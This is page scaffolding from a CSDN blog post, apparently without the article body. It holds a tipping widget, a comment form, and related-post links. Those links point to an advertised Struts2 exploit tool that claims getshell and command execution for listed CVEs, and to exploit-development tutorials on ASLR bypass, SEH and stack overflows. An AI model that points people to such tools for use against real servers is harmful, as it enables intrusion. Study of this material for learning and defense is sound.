			<img src="https://profile.csdnimg.cn/8/E/2/3_dupei" class="avatar_pic">
		</a>
		</dd>
		<dt>
			<p class="blog-name">dupei</p>
			<p class="blog-discript">你的鼓励将是我创作的最大动力</p>
		</dt>
	</dl>
	<div class="change-bt-box">
		<span class="reward-bt reward-bt-coin">C币</span>
		<span class="reward-bt-space"></span>
		<span class="reward-bt reward-bt-money reward-bt-active">余额</span>
	</div>
	<div class="money-box">
			<span class="choose_money choosed" data-id="2">2C币</span>
			<span class="choose_money " data-id="4">4C币</span>
			<span class="choose_money " data-id="6">6C币</span>
			<span class="choose_money " data-id="10">10C币</span>
			<span class="choose_money " data-id="20">20C币</span>
			<span class="choose_money " data-id="50">50C币</span>
	</div>
	<div class="sure-box">
		<p class="is-have-money"><a class="reward-sure">确定</a></p>
	</div>
</div>
            </li>
            <li class="tool-item tool-item-size tool-active tool-more">
              <a class="article-report">
                <img class="isdefault" src="https://csdnimg.cn/release/blogv2/dist/pc/img/tobarReport.png" alt="">
                <img class="isactive" src="https://csdnimg.cn/release/blogv2/dist/pc/img/tobarReportactive.png" style="display:none;" alt="">
                <span class="name">举报</span>
              </a>
            </li>
            <li class="tool-item">
                    <a class="tool-attend tool-bt-button tool-bt-attend" href="javascript:;" data-report-view='{"mod":"1592215036_002","spm":"1001.2101.3001.4232","extend1":"关注"}'>关注</a>
                <a class="tool-item-follow active-animation" style="display:none;">关注</a>
            </li>
            <li class="tool-item">
                    <p class="company active" id="health-companies" href="javascript:;" >一键三连</p>
                <span class="triplet-prompt">点赞Mark关注该博主, 随时了解TA的最新博文<img class="close-prompt" src="https://csdnimg.cn/release/blogv2/dist/pc/img/closePrompt.png"></span>
            </li>
        </ul>
        <div style="display:flex">
         </div>
         <div class="hot-word-tip-box">
          <span class="hot-word-text">已标记关键词</span>
          <span class="hot-word-count"></span> 
          <span class="hot-word-bar"></span>
          <span class="hot-word-clear">清除标记</span>
        </div>
    </div>  
</div>
<script__ type=text/javascript crossorigin src="https://csdnimg.cn/release/phoenix/production/qrcode-7c90a92189.min.js"></script__>
<script__ src="//g.csdnimg.cn/??sharewx/1.2.1/sharewx.js" type="text/javascript"></script__>
<script__ type="text/javascript" crossorigin src="https://g.csdnimg.cn/collection-box/2.0.3/collection-box.js"></script__>
                <div class="first-recommend-box recommend-box">
<div class="recommend-item-box type_download clearfix" data-url="https://download.csdn.net/download/qq396890445/8753641"  data-report-view='{"ab":"new","mod":"popu_871","extra":"{\"utm_medium\":\"distribute.pc_relevant_t0.none-task-download-2~default~BlogCommendFromMachineLearnPai2~default-1.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"1","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://download.csdn.net/download/qq396890445/8753641"}'>
	<div class="content-box">
		<div class="content-blog display-flex">
			<div class="title-box">
				<a href="https://download.csdn.net/download/qq396890445/8753641" class="tit ellipsis-online ellipsis-online-1" target="_blank"  data-report-click='{"ab":"new","mod":"popu_871","extra":"{\"utm_medium\":\"distribute.pc_relevant_t0.none-task-download-2~default~BlogCommendFromMachineLearnPai2~default-1.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"1","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://download.csdn.net/download/qq396890445/8753641"}'  data-report-query='utm_medium=distribute.pc_relevant_t0.none-task-download-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant_t0.none-task-download-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control'>
					K8 Struts2 <em>Exploit</em>(Struts2综合漏洞利用工具)
				</a>
			</div>
			<div class="info-box display-flex">
				<div class="info display-flex">
					<span class="info-block">05-30</span>
				</div>
			</div>
		</div>
		<div class="desc-box">
			<a href="https://download.csdn.net/download/qq396890445/8753641" target="_blank"  data-report-click='{"ab":"new","mod":"popu_871","extra":"{\"utm_medium\":\"distribute.pc_relevant_t0.none-task-download-2~default~BlogCommendFromMachineLearnPai2~default-1.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"1","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://download.csdn.net/download/qq396890445/8753641"}'  data-report-query='utm_medium=distribute.pc_relevant_t0.none-task-download-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant_t0.none-task-download-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control'>
				<div class="desc ellipsis-online ellipsis-online-1">K8 Struts2远程代码执行漏洞利用工具 (Apache Struts Remote Code Execution <em>Exploit</em>)
Struts2漏洞检测工具   Struts2漏洞测试工具  K8 struts2 <em>exploit</em> Test  Struts2 GetShell
目前已支持以下struts2漏洞编号 (S2-005 s2-009 s2-013 s2-016 s2-019 s2-020)  
[+] S2-020  CVE-2014-0094   支持GetShell (这洞特殊,EXP集成在飞刀)

[+] S2-019  CVE-2013-4316   支持GetShell/获取物理路径/执行CMD命令

[+] S2-016  CVE-2013-2251   支持GetShell/获取物理路径/执行CMD命令

[+] S2-013  CVE-2013-1966   支持GetShell/获取物理路径/执行CMD命令

[+] S2-009  CVE-2011-3923   支持GetShell/获取物理路径/执行CMD命令

[+] S2-005  CVE-2010-1870   支持GetShell/获取物理路径/执行CMD命令/列文件目录</div>
			</a>
		</div>
	</div>
</div>
                </div>
            <div class="second-recommend-box recommend-box">
<div class="recommend-item-box type_blog clearfix" data-url="https://wizard.blog.csdn.net/article/details/71057216"  data-report-view='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"1","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://wizard.blog.csdn.net/article/details/71057216"}'>
	<div class="content-box">
		<div class="content-blog display-flex">
			<div class="title-box">
				<a href="https://wizard.blog.csdn.net/article/details/71057216" class="tit ellipsis-online ellipsis-online-1" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"1","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://wizard.blog.csdn.net/article/details/71057216"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control'>
					Linux (x86) <em>Exploit</em> 开发系列教程之七 <em>绕过</em> ASLR -- 第二部分
				</a>
			</div>
			<div class="info-box display-flex">
				<div class="info">
					<a href="https://blog.csdn.net/wizardforcel" target="_blank"><span class="blog-title">龙哥盟</span></a>
				</div>
				<div class="info display-flex">
					<span class="info-block time">05-01</span>
					<span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
					1万+
					</span>
				</div>
			</div>
		</div>
		<div class="desc-box">
			<a href="https://wizard.blog.csdn.net/article/details/71057216" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"1","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://wizard.blog.csdn.net/article/details/71057216"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control'>
				<div class="desc ellipsis-online ellipsis-online-1"><em>绕过</em> ASLR &ndash; 第二部分
  译者：飞龙
  
  原文：Bypassing ASLR &ndash; Part II
  
  本文承接 @hackyzh 翻译的第六篇。
预备条件：经典的基于栈的溢出VM 配置：Ubuntu 12.04 (x86)这篇文章中，让我们看看如何<em>使用</em>爆破技巧，来<em>绕过</em>共享库地址随机化。
  什么是爆破？
在这个技巧中，攻击者选择特定的 Libc 机制，并持续攻击程序直到成功。假设</div>
			</a>
		</div>
	</div>
</div>
            </div>
<a id="commentBox" name="commentBox"></a>
<div class="comment-box">
	<div class="comment-edit-box d-flex">
		<a id="commentsedit"></a>
		<div class="user-img">
			<a href="javascript:void(0);" >
				<img class="show_loginbox" src="https://g.csdnimg.cn/static/user-img/anonymous-User-img.png">
			</a>
		</div>
		<form id="commentform">
			<img class="comment-sofa-flag" src="https://csdnimg.cn/release/blogv2/dist/pc/img/commentFlag@2x.png">
      <textarea class="comment-content" name="comment_content" id="comment_content" placeholder="优质评论可以帮助作者获得更高权重" maxlength="1000"></textarea>
			<div class="comment-emoticon"><img class="comment-emoticon-img" data-url="https://csdnimg.cn/release/blogv2/dist/pc/img/" src="https://csdnimg.cn/release/blogv2/dist/pc/img/emoticon.png" alt="表情包"></div> 
      <span class="comment-emoticon-tip">插入表情</span>
      <div class="comment-emoticon-box">
        <div class="comment-emoticon-img-box">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:001.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/001.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:002.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/002.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:003.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/003.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:004.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/004.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:005.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/005.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:006.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/006.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:007.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/007.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:008.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/008.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:009.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/009.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:010.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/010.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:011.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/011.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:012.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/012.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:013.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/013.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:014.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/014.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:015.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/015.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:016.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/016.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:017.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/017.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:018.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/018.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:019.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/019.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:020.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/020.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:021.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/021.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:022.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/022.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:023.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/023.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:024.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/024.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:025.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/025.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:026.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/026.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:027.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/027.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:028.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/028.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:029.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/029.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:030.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/030.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:031.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/031.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:032.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/032.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:033.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/033.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:034.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/034.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:035.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/035.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:036.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/036.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:037.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/037.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:038.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/038.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:039.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/039.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:040.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/040.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:041.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/041.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:042.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/042.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:043.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/043.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:044.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/044.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:045.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/045.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:046.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/046.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:047.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/047.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:048.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/048.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:049.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/049.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:050.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/050.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:051.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/051.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:052.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/052.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:053.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/053.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:054.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/054.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:055.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/055.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:056.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/056.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:057.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/057.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:058.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/058.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:059.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/059.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:060.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/060.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:061.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/061.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:062.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/062.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:063.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/063.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:064.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/064.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:065.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/065.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:066.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/066.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:067.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/067.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:068.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/068.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:069.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/069.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:070.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/070.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:071.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/071.png">
            <img class="emoticon-monkey-img" data-emoticon="[face]emoji:072.png[/face]" src="https://g.csdnimg.cn/static/face/emoji/072.png">
        </div>
      </div>
      <div class="opt-box">
				<div id="ubbtools" class="add_code">
					<a href="#insertcode" code="code" target="_self"><i class="icon iconfont icon-daima"></i></a>
				</div>
				<input type="hidden" id="comment_replyId" name="comment_replyId">
				<input type="hidden" id="article_id" name="article_id" value="53731221">
				<input type="hidden" id="comment_userId" name="comment_userId" value="">
				<input type="hidden" id="commentId" name="commentId" value="">
				<div class="dropdown" id="myDrap">
					<a class="dropdown-face d-flex align-items-center" data-toggle="dropdown" role="button"
						aria-haspopup="true" aria-expanded="false">
						<div class="txt-selected text-truncate">添加代码片</div>
						<svg class="icon d-block" width="200px" height="100.00px" viewBox="0 0 2048 1024" version="1.1" xmlns="http://www.w3.org/2000/svg"><path  d="M597.33333292 298.666667h853.333334L1023.99999992 725.333333 597.33333292 298.666667z"  /></svg>
					</a>
					<ul class="dropdown-menu" id="commentCode" aria-labelledby="drop4">
						<li><a data-code="html">HTML/XML</a></li>
						<li><a data-code="objc">objective-c</a></li>
						<li><a data-code="ruby">Ruby</a></li>
						<li><a data-code="php">PHP</a></li>
						<li><a data-code="csharp">C</a></li>
						<li><a data-code="cpp">C++</a></li>
						<li><a data-code="javascript">JavaScript</a></li>
						<li><a data-code="python">Python</a></li>
						<li><a data-code="java">Java</a></li>
						<li><a data-code="css">CSS</a></li>
						<li><a data-code="sql">SQL</a></li>
						<li><a data-code="plain">其它</a></li>
					</ul>
				</div>
				<div class="right-box" id="rightBox" data-type="2">
							<span id="tip_comment" class="tip">还能输入<em>1000</em>个字符</span>
							<a data-report-click='{"mod":"1582594662_003","spm":"1001.2101.3001.4227","ab":"new"}'><input type="submit"
									class="btn btn-sm btn-comment" value="发表评论"></a>
				</div>
			</div>
		</form>
		<input type="button" class="bt-comment-show" value="评论">
	</div>
	<div class="comment-list-container">
		<a id="comments"></a>
		<div class="comment-list-box">
		</div>
		<div id="commentPage" class="pagination-box d-none"></div>
		<div class="opt-box text-center">
			<div class="btn btn-sm btn-link-blue" id="btnMoreComment"></div>
		</div>
	</div>
</div>            <div class="recommend-tit-mod">相关推荐</div>
            <div class="recommend-box insert-baidu-box">
                <div class="recommend-item-box clearfix" style="display:none"></div>
<div class="recommend-item-box type_blog clearfix" data-url="https://wizard.blog.csdn.net/article/details/71131579"  data-report-view='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"2","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://wizard.blog.csdn.net/article/details/71131579"}'>
	<div class="content-box">
		<div class="content-blog display-flex">
			<div class="title-box">
				<a href="https://wizard.blog.csdn.net/article/details/71131579" class="tit ellipsis-online ellipsis-online-1" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"2","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://wizard.blog.csdn.net/article/details/71131579"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-2.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-2.control'>
					SploitFun Linux x86 <em>Exploit</em> 开发系列教程
				</a>
			</div>
			<div class="info-box display-flex">
				<div class="info">
					<a href="https://blog.csdn.net/wizardforcel" target="_blank"><span class="blog-title">龙哥盟</span></a>
				</div>
				<div class="info display-flex">
					<span class="info-block time">05-03</span>
					<span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
					1万+
					</span>
				</div>
			</div>
		</div>
		<div class="desc-box">
			<a href="https://wizard.blog.csdn.net/article/details/71131579" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"2","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://wizard.blog.csdn.net/article/details/71131579"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-2.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-2.control'>
				<div class="desc ellipsis-online ellipsis-online-1">SploitFun Linux x86 <em>Exploit</em> 开发系列教程原文：Linux (x86) <em>Exploit</em> <em>Development</em> Series
在线阅读
PDF格式
EPUB格式
MOBI格式
Github
译者
  章节
  译者  典型的基于堆栈的缓冲区溢出
  hackyzh
  整数溢出
  hackyzh
  Off-By-One 漏洞（基于栈）
  hackyzh
  <em>使用</em> re</div>
			</a>
		</div>
	</div>
</div>
<div class="recommend-item-box type_blog clearfix" data-url="https://blog.csdn.net/hustd10/article/details/51167902"  data-report-view='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-3.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"3","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://blog.csdn.net/hustd10/article/details/51167902"}'>
	<div class="content-box">
		<div class="content-blog display-flex">
			<div class="title-box">
				<a href="https://blog.csdn.net/hustd10/article/details/51167902" class="tit ellipsis-online ellipsis-online-1" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-3.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"3","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://blog.csdn.net/hustd10/article/details/51167902"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-3.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-3.control'>
					栈溢出笔记1.9 认识<em>SEH</em>
				</a>
			</div>
			<div class="info-box display-flex">
				<div class="info">
					<a href="https://blog.csdn.net/hustd10" target="_blank"><span class="blog-title">hustd10的博客</span></a>
				</div>
				<div class="info display-flex">
					<span class="info-block time">04-16</span>
					<span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
					4551
					</span>
				</div>
			</div>
		</div>
		<div class="desc-box">
			<a href="https://blog.csdn.net/hustd10/article/details/51167902" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-3.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"3","strategy":"2~default~BlogCommendFromMachineLearnPai2~default","dest":"https://blog.csdn.net/hustd10/article/details/51167902"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-3.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-3.control'>
				<div class="desc ellipsis-online ellipsis-online-1">从本节开始，我们就要研究一些稍微高级点的话题了，如同在1.2节中看到的，Windows中为抵抗栈溢出做了很多保护性的检查工作，编译的程序默认开启了这些保护。如果我们不能<em>绕过</em>这些保护，那么我们的Shellcode也就是一个玩具而已，什么都做不了。我们从<em>SEH</em>（结构化异常处理）开始。这篇文章讲<em>SEH</em>简洁易懂：http://www.<em>security</em>sift.com/windows-<em>exploit</em>-deve</div>
			</a>
		</div>
	</div>
</div>
		<dl id="recommend-item-box-tow" class="recommend-item-box type_blog clearfix">
			
		</dl>
<div class="recommend-item-box type_blog clearfix" data-url="https://blog.csdn.net/dupei/article/details/53559056"  data-report-view='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-4.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"4","strategy":"2~default~BlogCommendFromBaidu~default","dest":"https://blog.csdn.net/dupei/article/details/53559056"}'>
	<div class="content-box">
		<div class="content-blog display-flex">
			<div class="title-box">
				<a href="https://blog.csdn.net/dupei/article/details/53559056" class="tit ellipsis-online ellipsis-online-1" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-4.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"4","strategy":"2~default~BlogCommendFromBaidu~default","dest":"https://blog.csdn.net/dupei/article/details/53559056"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-4.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-4.control'>
					<em>Exploit</em> <em>Development</em> &ndash; Stack Overflow
				</a>
			</div>
			<div class="info-box display-flex">
				<div class="info">
					<a href="https://blog.csdn.net/dupei" target="_blank"><span class="blog-title">MD的技术博客</span></a>
				</div>
				<div class="info display-flex">
					<span class="info-block time">12-10</span>
					<span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
					700
					</span>
				</div>
			</div>
		</div>
		<div class="desc-box">
			<a href="https://blog.csdn.net/dupei/article/details/53559056" target="_blank"  data-report-click='{"ab":"new","mod":"popu_387","extra":"{\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-4.control\"}","dist_request_id":"1331996.9610.16189068437497885","index":"4","strategy":"2~default~BlogCommendFromBaidu~default","dest":"https://blog.csdn.net/dupei/article/details/53559056"}'  data-report-query='utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-4.control&dist_request_id=1331996.9610.16189068437497885&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-4.control'>
				<div class="desc ellipsis-online ellipsis-online-1">栈溢出，漏洞利用，<em>exploit</em></div>
			</a>
		</div>
	</div>
</div>
